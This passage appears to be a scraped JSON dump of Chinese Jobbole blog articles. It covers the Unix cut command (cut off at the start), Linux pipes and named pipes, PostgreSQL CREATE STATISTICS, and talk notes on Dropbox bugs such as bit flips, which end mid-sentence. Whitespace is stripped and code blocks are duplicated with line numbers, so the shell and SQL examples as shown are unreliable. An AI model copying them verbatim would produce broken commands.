ANCE\";catBALANCE.csv)&gt;BALANCE-WITH-HEADER.csvsh$cut-f6,7-d';'BALANCE-WITH-HEADER.csv|head-5#2018-03BALANCEDEBIT;CREDIT00000001615,00;00000000323,00;;00000001938,00使用-s选项，你可以做出相反的行为，这样cut将总是忽略这些行：sh$cut-s-f6,7-d';'BALANCE-WITH-HEADER.csv|head-5DEBIT;CREDIT00000001615,00;00000000323,00;;00000001938,0000000001333,00;1234567sh$cut-s-f6,7-d';'BALANCE-WITH-HEADER.csv|head-5DEBIT;CREDIT00000001615,00;00000000323,00;;00000001938,0000000001333,00;假如你好奇心强，你还可以探索这种特性，来作为一种相对隐晦的方式去保留那些只包含给定字符的行：#保留含有一个`e`的行sh$printf\"%s\\n\"{mighty,bold,great}-{condor,monkey,bear}|cut-s-f1--d'e'123#保留含有一个`e`的行sh$printf\"%s\\n\"{mighty,bold,great}-{condor,monkey,bear}|cut-s-f1--d'e'改变输出的分隔符作为一种扩展，GNU版本实现的cut允许通过使用--output-delimiter选项来为结果指定一个不同的域分隔符：sh$cut-f5,6--d';'--output-delimiter=\"*\"BALANCE.csv|headACCDOCLIB*DEBIT*CREDITALNEENRE-4701-LOC*00000001615,00*ALNEENRE-4701-LOC*00000000323,00*ALNEENRE-4701-LOC**00000001938,00ALNEENRE-4771-LOC*00000001333,00*ALNEENRE-4771-LOC*00000000266,60*ALNEENRE-4771-LOC**00000001599,60FACTFA00006253-BITQUIROBEN**00000001837,20FACTFA00006253-BITQUIROBEN*00000000306,20*FACTFA00006253-BITQUIROBEN*00000001531,00*123456789101112sh$cut-f5,6--d';'--output-delimiter=\"*\"BALANCE.csv|headACCDOCLIB*DEBIT*CREDITALNEENRE-4701-LOC*00000001615,00*ALNEENRE-4701-LOC*00000000323,00*ALNEENRE-4701-LOC**00000001938,00ALNEENRE-4771-LOC*00000001333,00*ALNEENRE-4771-LOC*00000000266,60*ALNEENRE-4771-LOC**00000001599,60FACTFA00006253-BITQUIROBEN**00000001837,20FACTFA00006253-BITQUIROBEN*00000000306,20*FACTFA00006253-BITQUIROBEN*00000001531,00*需要注意的是，在上面这个例子中，所有出现域分隔符的地方都被替换掉了，而不仅仅是那些在命令行中指定的作为域范围边界的分隔符。4、非POSIXGNU扩展说到非POSIXGNU扩展，它们中的某些特别有用。特别需要提及的是下面的扩展也同样对字节、字符或者域范围工作良好（相对于当前的GNU实现来说）。--complement：想想在sed地址中的感叹符号(!)，使用它，cut将只保存没有被匹配到的范围:#只保留第5个域sh$cut-f5-d';'BALANCE.csv|head-3ACCDOCLIBALNEENRE-4701-LOCALNEENRE-4701-LOC#保留除了第5个域之外的内容sh$cut--complement-f5-d';'BALANCE.csv|head-3ACCDOC;ACCDOCDATE;ACCOUNTNUM;ACCOUNTLIB;DEBIT;CREDIT4;1012017;623477;TIDESCHEDULE;00000001615,00;4;1012017;445452;VATBS/ENC;00000000323,00;123456789101112#只保留第5个域sh$cut-f5-d';'BALANCE.csv|head-3ACCDOCLIBALNEENRE-4701-LOCALNEENRE-4701-LOC#保留除了第5个域之外的内容sh$cut--complement-f5-d';'BALANCE.csv|head-3ACCDOC;ACCDOCDATE;ACCOUNTNUM;ACCOUNTLIB;DEBIT;CREDIT4;1012017;623477;TIDESCHEDULE;00000001615,00;4;1012017;445452;VATBS/ENC;00000000323,00;--zero-terminated(-z)：使用NUL字符来作为行终止符，而不是新行newline字符。当你的数据包含新行字符时，-z选项就特别有用了，例如当处理文件名的时候（因为在文件名中新行字符是可以使用的，而NUL则不可以）。为了展示-z选项，让我们先做一点实验。首先，我们将创建一个文件名中包含换行符的文件：bash$touch$'EMPTY\\nFILE\\nWITHFUNKY\\nNAME'.txtbash$ls-1*.txtBALANCE.txtBALANCE-V2.txtEMPTY?FILE?WITHFUNKY?NAME.txt123456bash$touch$'EMPTY\\nFILE\\nWITHFUNKY\\nNAME'.txtbash$ls-1*.txtBALANCE.txtBALANCE-V2.txtEMPTY?FILE?WITHFUNKY?NAME.txt现在假设我想展示每个*.txt文件的前5个字符。一个想当然的解决方法将会失败：sh$ls-1*.txt|cut-c1-5BALANBALANEMPTYFILEWITHNAME.12345678sh$ls-1*.txt|cut-c1-5BALANBALANEMPTYFILEWITHNAME.你可以已经知道ls是为了方便人类使用而特别设计的，并且在一个命令管道中使用它是一个反模式（确实是这样的）。所以让我们用find来替换它：sh$find.-name'*.txt'-printf\"%f\\n\"|cut-c1-5BALANEMPTYFILEWITHNAME.BALAN12345678sh$find.-name'*.txt'-printf\"%f\\n\"|cut-c1-5BALANEMPTYFILEWITHNAME.BALAN上面的命令基本上产生了与先前类似的结果（尽管以不同的次序，因为ls会隐式地对文件名做排序，而find则不会）。在上面的两个例子中，都有一个相同的问题，cut命令不能区分新行字符是数据域的一部分（即文件名），还是作为最后标记的新行记号。但使用NUL字节（\\0）来作为行终止符就将排除掉这种混淆的情况，使得我们最后可以得到期望的结果：#我被告知在某些旧版的`tr`程序中需要使用`\\000`而不是`\\0`来代表NUL字符（假如你需要这种改变请让我知晓！）sh$find.-name'*.txt'-printf\"%f\\0\"|cut-z-c1-5|tr'\\0''\\n'BALANEMPTYBALAN123456#我被告知在某些旧版的`tr`程序中需要使用`\\000`而不是`\\0`来代表NUL字符（假如你需要这种改变请让我知晓！）sh$find.-name'*.txt'-printf\"%f\\0\"|cut-z-c1-5|tr'\\0''\\n'BALANEMPTYBALAN通过上面最后的例子，我们就达到了本文的最后部分了，所以我将让你自己试试-printf后面那个有趣的\"%f\\0\"参数或者理解为什么我在管道的最后使用了tr命令。使用cut命令可以实现更多功能我只是列举了cut命令的最常见且在我眼中最基础的使用方式。你甚至可以将它以更加实用的方式加以运用，这取决于你的逻辑和想象。不要再犹豫了，请使用下面的评论框贴出你的发现。最后一如既往的，假如你喜欢这篇文章，请不要忘记将它分享到你最喜爱网站和社交媒体中！1赞1收藏1评论", "url_object_id": "4d6bef2ddde822a0049770aa2eb79a8f"},{"title": "介绍 Linux 中的管道和命名管道", "url": "http://blog.jobbole.com/114379/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/09/a836f3cdf91cb1dcf551a3cd4f561da6.jpg"], "praise_nums": 1, "fav_nums": 0, "comments_nums": 0, "tags": "2,0,1,8,/,0,9,/,1,2, ,·", "content": "原文出处：ArchitModi译文出处：Linux中国/geekpi要在命令间移动数据？使用管道可使此过程便捷。在Linux中，pipe能让你将一个命令的输出发送给另一个命令。管道，如它的名称那样，能重定向一个进程的标准输出、输入和错误到另一个进程，以便于进一步处理。“管道”（或称“未命名管道”）命令的语法是在两个命令之间加上|字符：Command-1|Command-2|...|Command-N1Command-1|Command-2|...|Command-N这里，该管道不能通过另一个会话访问；它被临时创建用于接收Command-1的执行并重定向标准输出。它在成功执行之后删除。在上面的示例中，contents.txt包含特定目录中所有文件的列表——具体来说，就是ls-al命令的输出。我们首先通过管道（如图所示）使用“file”关键字从contents.txt中grep文件名，因此cat命令的输出作为grep命令的输入提供。接下来，我们添加管道来执行awk命令，该命令显示grep命令的过滤输出中的第9列。我们还可以使用wc-l命令计算contents.txt中的行数。只要系统启动并运行或直到它被删除，命名管道就可以持续使用。它是一个遵循FIFO（先进先出）机制的特殊文件。它可以像普通文件一样使用。也就是，你可以写入，从中读取，然后打开或关闭它。要创建命名管道，命令为：mkfifo&lt;pipe-name&gt;1mkfifo&lt;pipe-name&gt;这将创建一个命名管道文件，它甚至可以在多个shell会话中使用。创建FIFO命名管道的另一种方法是使用此命令：mknodp&lt;pipe-name&gt;1mknodp&lt;pipe-name&gt;要重定向任何命令的标准输出到其它命令，请使用&gt;符号。要重定向任何命令的标准输入，请使用&lt;符号。如上所示，ls-al命令的输出被重定向到contents.txt并插入到文件中。类似地，tail命令的输入通过&lt;符号从contents.txt读取。这里，我们创建了一个命名管道my-named-pipe，并将ls-al命令的输出重定向到命名管道。我们可以打开一个新的shell会话并cat命名管道的内容，如前所述，它显示了ls-al命令的输出。请注意，命名管道的大小为零，并有一个标志“p”。因此，下次你在Linux终端上使用命令并在命令之间移动数据时，希望管道使这个过程快速简便。1赞收藏评论", "url_object_id": "8470a72bff4d46a52fb85dff84f81bb0"},{"title": "10 个你不知道的 PostgreSQL 功能：创建统计信息", "url": "http://blog.jobbole.com/114232/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2013/03/PostgreSQL-logo.gif"], "praise_nums": 1, "fav_nums": 1, "comments_nums": 0, "tags": "2,0,1,8,/,0,7,/,2,6, ,·", "content": "原文出处：SamaySharma译文出处：开源中国如果你曾使用Postgres做过一些性能优化，你或许已经使用过EXPLAIN。EXPLAIN向你展示了PostgreSQLplanner为提供的语句生成的执行计划。它说明了语句涉及到的表将会使用顺序扫描、索引扫描等方式进行扫描，在使用多表的情况下将会使用连接算法。但是，Postgres是如何产生这些规划的？决定使用哪种规划的一个非常重要的输入是planner收集到的数据统计。这些统计的数据能够使planner评估执行规划的某一部分会返回多少行，继而影响到使用哪一种规划或连接算法。它们主要是通过运行ANALYZE或VACUUM（和一些DDL命令，比如说CREATEINDEX)来采集或更新的。这些统计信息由planner存储在pg_class和pg_statistics中。Pg_class基本上存储了每个表和索引中的条目总数，以及它们所占用的磁盘块数。Pg_statistic存储关于每列的统计信息，例如哪些列的%值为null，哪些是最常见的值，直方图边界等。你可以查看下面的示例，以了解Postgres在下表中为col1收集的统计信息类型。下面的查询输出展示了planner（正确地）预估表中列col1中有1000个不同的值，并且还对最常见的值、频率等进行了其他预估。请注意，我们已经查询了pg_stats（一个拥有更多可读版本的列统计信息的视图）。CREATETABLEtbl(col1int,col2int);INSERTINTOtblSELECTi/10000,i/100000FROMgenerate_series(1,10000000)s(i);ANALYZEtbl;select*frompg_statswheretablename='tbl'andattname='col1';-[RECORD1]----------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------schemaname|publictablename|tblattname|col1inherited|fnull_frac|0avg_width|4n_distinct|1000most_common_vals|{318,564,596,...}most_common_freqs|{0.00173333,0.0017,0.00166667,0.00156667,...}histogram_bounds|{0,8,20,30,39,...}correlation|1most_common_elems|most_common_elem_freqs|elem_count_histogram|1234567891011121314151617181920212223242526CREATETABLEtbl(col1int,col2int);INSERTINTOtblSELECTi/10000,i/100000FROMgenerate_series(1,10000000)s(i);ANALYZEtbl;select*frompg_statswheretablename='tbl'andattname='col1';-[RECORD1]----------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------schemaname|publictablename|tblattname|col1inherited|fnull_frac|0avg_width|4n_distinct|1000most_common_vals|{318,564,596,...}most_common_freqs|{0.00173333,0.0017,0.00166667,0.00156667,...}histogram_bounds|{0,8,20,30,39,...}correlation|1most_common_elems|most_common_elem_freqs|elem_count_histogram|单列统计数据不足时这些单列统计信息可帮助planner估算你的条件选择性（这是planner用来估算索引扫描将选择多少行的内容）。当查询中存在多个条件时，planner假定列（或where子句条件）彼此独立。当列相互关联或相互依赖并导致planner低估或高估这些条件将返回的行数时，就不适用。我们来看下面的几个例子。为了使查询计划易于阅读，我们通过设置max_parallel_workers_per_gather为0来关闭每个查询的并行性：EXPLAINANALYZESELECT*FROMtblwherecol1=1;QUERYPLAN-----------------------------------------------------------------------------------------------------------SeqScanontbl(cost=0.00..169247.80rows=9584width=8)(actualtime=0.641..622.851rows=10000loops=1)Filter:(col1=1)RowsRemovedbyFilter:9990000Planningtime:0.051msExecutiontime:623.185ms(5rows)123456789EXPLAINANALYZESELECT*FROMtblwherecol1=1;QUERYPLAN-----------------------------------------------------------------------------------------------------------SeqScanontbl(cost=0.00..169247.80rows=9584width=8)(actualtime=0.641..622.851rows=10000loops=1)Filter:(col1=1)RowsRemovedbyFilter:9990000Planningtime:0.051msExecutiontime:623.185ms(5rows)正如你看到的那样，planner估计col1的值为1的行数是9584，而查询返回的实际行数是10000，所以相当准确。当你在column1和column2都包含过滤器时会发生什么情况。EXPLAINANALYZESELECT*FROMtblwherecol1=1andcol2=0;QUERYPLAN----------------------------------------------------------------------------------------------------------SeqScanontbl(cost=0.00..194248.69rows=100width=8)(actualtime=0.640..630.130rows=10000loops=1)Filter:((col1=1)AND(col2=0))RowsRemovedbyFilter:9990000Planningtime:0.072msExecutiontime:630.467ms(5rows)123456789EXPLAINANALYZESELECT*FROMtblwherecol1=1andcol2=0;QUERYPLAN----------------------------------------------------------------------------------------------------------SeqScanontbl(cost=0.00..194248.69rows=100width=8)(actualtime=0.640..630.130rows=10000loops=1)Filter:((col1=1)AND(col2=0))RowsRemovedbyFilter:9990000Planningtime:0.072msExecutiontime:630.467ms(5rows)planner的估计减少了100倍！让我们试着理解为什么发生这种情况。第一个列的选择性约为0.001（1/1000），第二个列的选择性为0.01（1/100）。要计算将由这两个“独立”条件过滤的行数，planner会将它们的选择性相乘。所以，我们得到：选择性=0.001*0.01=0.00001。当它乘以我们在表中的行数即10000000时，我们得到100。这就是planner对100的估计值的来源。但是，这些列不是独立的，那么我们如何告知planner？在PostgreSQL中创建统计信息在Postgres10之前，没有一种简易的方式去告诉planner采集捕捉列之间关系的数据统计。但是，Postgres10有一个新特性正好解决了这个问题，可以使用CREATESTATISTICS来创建扩展统计的对象，告诉服务器去采集这些有意思的相关列的额外的统计信息。函数依赖统计回到我们先前评估的问题，col2的值仅仅是col1/10。在数据库的术语中，我们会说col2是函数依赖于col1，也就是说，col1的值足以决定col2的值，并且不存在有两行数据拥有相同的col1值的同时有不同的col2值。因此，在col2列上的第二个过滤筛选并没有移除任何行！但是，planner捕捉到了足够的统计信息去知道这件事情。让我们来创建一个统计对象去捕获这些列和运行分析（ANALYZE）所依赖的函数统计。CREATESTATISTICSs1(dependencies)oncol1,col2fromtbl;ANALYZEtbl;12CREATESTATISTICSs1(dependencies)oncol1,col2fromtbl;ANALYZEtbl;让我们来看看现在的计划是怎么来的。EXPLAINANALYZESELECT*FROMtblwherecol1=1andcol2=0;QUERYPLAN-----------------------------------------------------------------------------------------------------------SeqScanontbl(cost=0.00..194247.76rows=9584width=8)(actualtime=0.638..629.741rows=10000loops=1)Filter:((col1=1)AND(col2=0))RowsRemovedbyFilter:9990000Planningtime:0.115msExecutiontime:630.076ms(5rows)123456789EXPLAINANALYZESELECT*FROMtblwherecol1=1andcol2=0;QUERYPLAN-----------------------------------------------------------------------------------------------------------SeqScanontbl(cost=0.00..194247.76rows=9584width=8)(actualtime=0.638..629.741rows=10000loops=1)Filter:((col1=1)AND(col2=0))RowsRemovedbyFilter:9990000Planningtime:0.115msExecutiontime:630.076ms(5rows)很好！让我们看一下对计划的测量。SELECTstxname,stxkeys,stxdependenciesFROMpg_statistic_extWHEREstxname='s1';stxname|stxkeys|stxdependencies---------+---------+----------------------s1|12|{\"1=&gt;2\":1.000000}(1row)1234567SELECTstxname,stxkeys,stxdependenciesFROMpg_statistic_extWHEREstxname='s1';stxname|stxkeys|stxdependencies---------+---------+----------------------s1|12|{\"1=&gt;2\":1.000000}(1row)看这里，我们可以看到，Postgres意识到col1完全决定col2，因此用系数1来捕获这些信息。现在，所有的查询都过滤这些列之后，计划将会得到更好的评估。ndistinct统计函数依赖是你可以在列之间捕获的一种关系。你可以捕获的另一种统计信息是一组列的不同值。我们之前指出，planner可以获取每列不同值的统计数字，但再次合并多列时，这些统计数据往往是错误的。这些不好的数据是在什么时候影响我们的呢？下面来看一个例子。EXPLAINANALYZESELECTcol1,col2,count(*)fromtblgroupbycol1,col2;QUERYPLAN-----------------------------------------------------------------------------------------------------------------------------GroupAggregate(cost=1990523.20..2091523.04rows=100000width=16)(actualtime=2697.246..4470.789rows=1001loops=1)GroupKey:col1,col2-&gt;Sort(cost=1990523.20..2015523.16rows=9999984width=8)(actualtime=2695.498..3440.880rows=10000000loops=1)SortKey:col1,col2SortMethod:externalsortDisk:176128kB-&gt;SeqScanontbl(cost=0.00..144247.84rows=9999984width=8)(actualtime=0.008..665.689rows=10000000loops=1)Planningtime:0.072msExecutiontime:4494.583ms1234567891011EXPLAINANALYZESELECTcol1,col2,count(*)fromtblgroupbycol1,col2;QUERYPLAN-----------------------------------------------------------------------------------------------------------------------------GroupAggregate(cost=1990523.20..2091523.04rows=100000width=16)(actualtime=2697.246..4470.789rows=1001loops=1)GroupKey:col1,col2-&gt;Sort(cost=1990523.20..2015523.16rows=9999984width=8)(actualtime=2695.498..3440.880rows=10000000loops=1)SortKey:col1,col2SortMethod:externalsortDisk:176128kB-&gt;SeqScanontbl(cost=0.00..144247.84rows=9999984width=8)(actualtime=0.008..665.689rows=10000000loops=1)Planningtime:0.072msExecutiontime:4494.583ms聚合行时，Postgres选择做散列聚合或组合。如果它认为散列表合适，则选择散列聚合，否则它会选择对所有行进行排序，然后按照col1、col2对它们进行分组。现在，planner估计组的数量（等于col1、col2的不同值的数量）将为100000。它预计到它没有足够的work_mem将该散列表存储在内存中。因此，它使用基于磁盘的排序来运行该查询。但是，正如在查询计划中所看到的那样，实际行数仅为1001。也许，我们有足够的内存来执行哈希聚合。让planner去捕获n_distinct统计信息，重新运行查询并找出结果。CREATESTATISTICSs2(ndistinct)oncol1,col2fromtbl;ANALYZEtbl;EXPLAINANALYZESELECTcol1,col2,count(*)fromtblgroupbycol1,col2;QUERYPLAN-----------------------------------------------------------------------------------------------------------------------HashAggregate(cost=219247.63..219257.63rows=1000width=16)(actualtime=2431.767..2431.928rows=1001loops=1)GroupKey:col1,col2-&gt;SeqScanontbl(cost=0.00..144247.79rows=9999979width=8)(actualtime=0.008..643.488rows=10000000loops=1)Planningtime:0.129msExecutiontime:2432.010ms(5rows)123456789101112CREATESTATISTICSs2(ndistinct)oncol1,col2fromtbl;ANALYZEtbl;EXPLAINANALYZESELECTcol1,col2,count(*)fromtblgroupbycol1,col2;QUERYPLAN-----------------------------------------------------------------------------------------------------------------------HashAggregate(cost=219247.63..219257.63rows=1000width=16)(actualtime=2431.767..2431.928rows=1001loops=1)GroupKey:col1,col2-&gt;SeqScanontbl(cost=0.00..144247.79rows=9999979width=8)(actualtime=0.008..643.488rows=10000000loops=1)Planningtime:0.129msExecutiontime:2432.010ms(5rows)可以看到，现在的估算精度更高了（即1000），查询速度也提高了2倍左右。通过运行下面的查询，我们可以看到planner学到了什么。SELECTstxkeysASk,stxndistinctASndFROMpg_statistic_extWHEREstxname='s2';k|nd-----+----------------12|{\"1,2\":1000}123456SELECTstxkeysASk,stxndistinctASndFROMpg_statistic_extWHEREstxname='s2';k|nd-----+----------------12|{\"1,2\":1000}现实影响在实际的生产模式中，你总是会有某些与数据库不知道的相互依赖或关系的列。以下是我们与Citus客户见过的一些例子：有月份，季度和年份的列，因为你希望在报告中显示按所有人分组的统计信息。地理层次之间的关系。例如。具有国家，州和城市的列，并由它们来过滤/分组。这里的例子仅仅是在数据集中只有10M行的情况，并且我们已经看到，在存在相关列的情况下，使用CREATE统计信息可显着改善查询计划，并显示性能改进。在Citus使用案例中，我们有客户存储数十亿行数据，糟糕查询计划的影响可能非常严重。在上述示例中，当planner选择了一个糟糕的查询计划时，我们不得不为10M行做一个基于磁盘的分类。想象一下如果是数十亿行，那会有多糟糕。1赞1收藏评论", "url_object_id": "c22f24194b40ae376ad2e2d388945335"},{"title": "程序员，热爱你的 bug", "url": "http://blog.jobbole.com/114165/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/06/2034139cf13a5d2840500f5a15322217.png"], "praise_nums": 1, "fav_nums": 0, "comments_nums": 0, "tags": "2,0,1,8,/,0,7,/,2,6, ,·", "content": "本文由伯乐在线-学以致用123翻译，艾凌风校稿。未经许可，禁止转载！英文出处：AllisonKaptur。欢迎加入翻译组。2017年10月初，我在贝洛奥里藏特(巴西)的PythonBrasil大会做了一个主题演讲。下面是这个演讲的笔记。这里可以下载视频。我热爱bug我现在是Pilot.com的高级工程师，为初创公司开发自动记账系统。在这之前，我在Dropbox的桌面客户端团队工作，后面我会讲到在那里工作时的一些小故事。在那之前，我是RecurseCenter的一个推进者，RecurseCenter对于程序员的感觉很像写作者的隐居地。我在大学学习的是天体物理学，在成为工程师之前在金融机构工作了几年。但是这些事情没有一件是重要的—你只需要记住我热爱bug就足够了。我热爱bug是因为它们非常有趣。它们富有戏剧性。一个大bug的查找过程曲折离奇。一个大bug很像一个很好的笑话或谜语，你期待一个输出，但结果却大相径庭。在这个讲演中，我将会讲述一些我热爱的bug，解释我为什么如此热爱bug，然后说服你也应该热爱bug。第一个Bug好，直接进入第一个Bug。这是我在Dropbox遇到的一个bug。你可能知道，Dropbox是个应用程序，可以将文件从一台计算机同步到云端，并同步到其它计算机。+--------------++---------------+|||||METASERVER||BLOCKSERVER|||||+-+--+---------++---------+-----+^|^|||||+----------+||+---&gt;|||||CLIENT+--------++--------+|+----------+123456789101112+--------------++---------------+|||||METASERVER||BLOCKSERVER|||||+-+--+---------++---------+-----+^|^|||||+----------+||+---&gt;|||||CLIENT+--------++--------+|+----------+这是一个简化的Dropbox架构图。桌面客户端在本地监控文件系统的变化。当它找到一个改变的文件，将阅读文件并对4MB块中的内容进行哈希处理。这些块存储在一个巨大的键值对存储后端，我们称之为blockserver。键是经哈希处理的内容的摘要，值是内容本身。当然，我们要避免多次上传同一个块。想象一下，你正在写一个文档，很可能只是更改了结尾–我们不希望一次又一次的上传开头部分。因此，在将块上传到blockserver之前，客户端与另一个管理metadata和权限的服务器通信，客户端询问meta服务器是否需要这个块或者是否见过这个块。meta服务器对每个块是否需要上传进行响应。所以，请求和响应看起来是这样的：客户端：’我有一个由哈希块'abcd,deef,efgh'组成的更改文件。服务器响应”我有前面两个，上传第三个”。然后客户端将第三个上传到blockserver。+--------------++---------------+|||||METASERVER||BLOCKSERVER|||||+-+--+---------++---------+-----+^|^||'ok,ok,need'|'abcd,deef,efgh'||+----------+|efgh:[contents]|+---&gt;|||||CLIENT+--------++--------+|+----------+123456789101112+--------------++---------------+|||||METASERVER||BLOCKSERVER|||||+-+--+---------++---------+-----+^|^||'ok,ok,need'|'abcd,deef,efgh'||+----------+|efgh:[contents]|+---&gt;|||||CLIENT+--------++--------+|+----------+上面是设想，下面的则是bug。+--------------+|||METASERVER|||+-+--+---------+^|||'???''abcdldeef,efgh'||+----------+^|+---&gt;||^||CLIENT++--------+|+----------+123456789101112+--------------+|||METASERVER|||+-+--+---------+^|||'???''abcdldeef,efgh'||+----------+^|+---&gt;||^||CLIENT++--------+|+----------+有时，客户端会发出一个奇怪的请求：每个哈希值应该是16个字符长，但是请求的长度是33个字符，比期望长度的两倍还多1。服务器不知道该怎么处理这个异常，会抛出一个异常。我们看到这个异常报告，并查看客户端的日志文件，真是奇怪的现象—客户端本地数据库损坏了，或者python将抛出MemoryErrors，所有这些都没有道理。如果你从没有见过这个问题，那么这完全是个谜。但是一旦见过一次，之后的每一次都会认出它。这里有个提示：我们经常看到的33个字符长的字符串的中间的字符不是逗号而是l。下面是我们在中间位置看到的其他字符：l\\x0c&lt;$(.-1l\\x0c&lt;$(.-逗号的ascii码是44，l的ascii码是108，在二进制中，它们是这表示的：bin(ord(',')):0101100bin(ord('l')):110110012bin(ord(',')):0101100bin(ord('l')):1101100你将发现l与逗号仅仅相差1位。而这就是问题所在：一个位翻转(bitflip）。客户端使用的内存有一个bit损坏了，现在客户端正在向服务器发送垃圾请求。下面是出现位翻转时我们经常看到代替逗号的其他字符：,:0101100l:1101100\\x0c:0001100&lt;:0111100$:0100100(:0101000.:0101110-:010110112345678,:0101100l:1101100\\x0c:0001100&lt;:0111100$:0100100(:0101000.:0101110-:0101101位翻转是真实存在的！我热爱这个bug是因为它证明了位翻转是真实存在的，而不只是理论概念。实际上，这种情况在一些领域中比其他领域更常见。从低端或老硬件的用户获得请求是其中一个，这是很多运行Dropbox的笔记本电脑的真实情况。另外一个有很多位翻转的领域是外层空间——太空没有大气层来保护内存免受高能粒子和辐射的影响，所以位翻转很常见。在太空中，你可能真的非常关心数据的正确性。比如，你的代码可能用于让国际空间站中的宇航员生存下去，即使不是这样的关键任务，在太空中进行软件更新是很难的。如果真的需要应用程序不存在位翻转，可以采取多种硬件和软件方法。对于这个问题，KatieBetchold有一个非常有趣的演讲。Dropbox不需要处理位翻转。损坏内存的电脑是用户的，我们可以检测到逗号是否发生了位翻转，但如果它是不同的字符，我们不一定会知道，如果位翻转发生在磁盘读取的实际文件中，我们就不知道了。我们可以发现这个问题的空间太有限了，因此我们决定不对异常进行处理并继续。这类bug通常可以通过客户端重启电脑解决。不容易发生的bug并不是不可能的这是它成为我最喜欢的bug的原因之一。它可以提醒我们unlikely和impossible的区别。在足够的规模下，unlikely事件以明显的速率发生。通用bug我最喜欢这个错误的第二个原因在于通用。这个bug可能发生在桌面客户端与server通信的任何位置，系统中有很多不同的端点和组件。这意味着Dropbox的许多工程师将会看到这个bug的不同版本。当你第一次看到它时，真的非常伤脑筋，但是之后很容易诊断，而且检查非常快：只需要看看中间的字符是不是l。文化差异这个bug的一个有趣的副作用是它暴露了服务器团队和客户端团队的文化差异。有时候服务器小组的成员会发现这个bug并进行调查。如果一台服务器正在翻转位，这可能不是偶然的现象–很可能是内存损坏，你需要找到受影响的机器并尽快将其从服务器池中移出，否则可能会损坏大量的用户数据。这是一个事件，你需要快速回应。但是，如果用户的机器正在损坏数据，那么可以做的事情就不多了。分享你的Bug所以，如果你正在研究一个令人困惑的bug，特别是大系统中的一个bug，不要忘了与别人交流。也许你的同事之前看到过一个这样bug。如果他们看到过，可以节省很多时间。如果他们不知道，记得告诉别人解决问题的方法–写下来或在团队会议上讲出来。下一次你们的队伍有类似的事情发生时，你们会更有准备。Bug如何帮助我们学习RecurseCenter加入Dropbox之前，我在RecurseCenter(RC)工作。RC是一个社区，它的的理念是帮助具备自我导向的学习者通过协作共同成长为更好的程序员。这是RC的全部：这里没有任何课程、作业或者截止日期。唯一的课题是分享变为更好的程序员的目标。我们看到很多获得CS学位但是对实际编程没有把握的人参加这个项目，或者写了十年Java又想学习Clojure或者Haskell的人参加这个项目，当然还有很多其他的参与者。我的工作是推进者，工作职责是帮助用户填补缺乏的结构和根据从以前的参与者身上学到的东西提供指导。所以我和我的同事对于帮助自我激励的成年人学习最好的技术非常感兴趣。刻意练习这个领域有很多不同的研究，我认为最有趣的一项研究是刻意练习的思想。刻意练习试图解释专家与业余爱好者的差别。这里的指导原则是，如果你只关注与生俱来的特征-遗传或其他-它们不会对解释差异做出太大贡献。因此研究人员（开始是Ericsson,Krampe和Tesch-Romer）开始研究是什么造成了这些差异。他们的结论是花费在刻意练习上的时间。刻意练习定义的范围非常狭窄：不是为了报酬，也不是为了玩乐。我们必须在自己能力的边缘进行练习，做一个适合自己水平的项目（不会容易的学不到任何东西，也不会困难到毫无进展）。还必须获得做法是否有效的及时反馈。这非常令人兴奋，因为这是如何构建专业知识的框架。但是挑战在于，对于程序员来讲，这个建议难以实现。程序员很难知道自己是否在能力边缘工作，及时反馈也非常罕见（在某些情况下可能会立即得到反馈，而在其他情况下可能需要几个月的时间才会有反馈）。你可以在REPL等一些小事上得到快速反馈，但是如何进行设计决策或者选择技术，很可能很长时间都无法得到反馈。但是刻意练习对于调试代码非常有用。如果编写代码，编代码时会有代码如何工作的心智模式。如果代码有一个bug，那么心智模式并不完全正确。根据刻意练习的定义，你处在理解的边缘，太棒了，你即将学习新的东西。如果你能够重现bug，那么可以立即获得修复是否正确的反馈（这种情况非常罕见）。这种类型的bug可能会使你了解一些关于自己程序的信息，也有可能学到代码所运行的系统的更多内容。我这里有一个这样的bug的故事。第二个Bug这个bug也是在Dropbox工作时遇到的。那时，我正在研究为什么有些桌面客户端不按时发送日志。我深入研究了客户端日志系统并发现一些有意思的bug。我们这里谈到的只是其中与这个故事有关一部分。下面是系统架构简图。+--------------+||+---++----------&gt;|LOGSERVER||log||||+---+|+------+-------+||+-----+----+|200ok||||CLIENT|&lt;-----------+||+-----+----+^+--------+--------+--------+|^^|+--+--++--+--++--+--++--+--+|log||log||log||log|||||||||||||||||+-----++-----++-----++-----+12345678910111213141516171819+--------------+||+---++----------&gt;|LOGSERVER||log||||+---+|+------+-------+||+-----+----+|200ok||||CLIENT|&lt;-----------+||+-----+----+^+--------+--------+--------+|^^|+--+--++--+--++--+--++--+--+|log||log||log||log|||||||||||||||||+-----++-----++-----++-----+桌面客户端将生成日志。这些日志被压缩、加密并写入磁盘，然后客户端定期将它们发送到服务器。客户端将从磁盘读取日志并将它们发送到日志服务器。日志服务器将解密并存储，然后返回200响应。如果客户端无法连接日志服务器，它不会让日志目录无限增大。当日志目录达到一定大小时，客户端将删除日志从而保证日志目录的大小在最大范围之内。最初的两个bug是些小问题。第一个是桌面客户端向服务器发送日志时从最旧的开始（而不是从最新的开始）。这不是我们想要的，比如，如果客户端报告了一个异常，服务器将要求客户端发送日志文件，这时你可能关心刚刚发生的情况的日志，而不是磁盘上最旧的日志。第二个bug与第一个类似：如果日志目录达到设置的最大值，客户端将从最新的日志开始删除（而不是删除最旧的日志）。这时，哪种方法都会删除日志，只是我们更关心比较新的日志。第三个bug与加密有关。有时，服务器无法解密日志文件（我们通常无法找到原因-可能是字节反转）。后端无法正确处理这个错误，因此服务器会返回500响应。客户端在接收到500响应时的表现相当合理：它将假设服务器已关闭。因此，它会停止发送日志文件，不再尝试发送其它文件。对损坏的日志文件返回500响应显然是错误